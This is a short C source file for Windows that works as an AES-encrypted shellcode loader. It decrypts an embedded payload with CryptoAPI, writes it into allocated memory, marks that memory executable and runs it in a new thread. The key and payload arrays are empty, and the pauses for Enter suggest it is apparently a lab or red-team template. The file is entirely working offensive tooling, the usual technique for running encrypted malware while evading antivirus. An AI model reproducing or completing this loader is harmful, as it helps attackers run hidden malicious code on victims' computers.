#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int DecryptAES(char * payload, unsigned int payload_len, char * key, size_t keylen)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	
	if(!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		return -1;
	}
	
	if(!CryptCreateHash(hProv, CALG_SHA_256, 0,0, &hHash))
	{
		return -1;
	}
	if(!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen,0))
	{
		return -1;
	}
	if(!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
	{
		return -1;
	}
	if(!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len))
	{
		return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int main(void)
{
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;
	
	char encryption_key[] = { };
	unsigned char payload[] = {};
	
	unsigned int payload_length = sizeof(payload);
	
	alloc_mem = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);
	
	printf("Press enter to decrypt");
	getchar();
	
	DecryptAES((char *) payload, payload_length, encryption_key, sizeof(encryption_key));
	
	RtlMoveMemory(alloc_mem, payload, payload_length);
	
	retval = VirtualProtect(alloc_mem, payload_length, PAGE_EXECUTE_READ, &oldprotect);
	
	printf("Press enter to create thread");
	getchar();
	
	if(retval!=0)
	{
		threadHandle = CreateThread(0,0, (LPTHREAD_START_ROUTINE) alloc_mem,0,0,0);
		WaitForSingleObject(threadHandle, -1);
	}
	
	return 0;
}
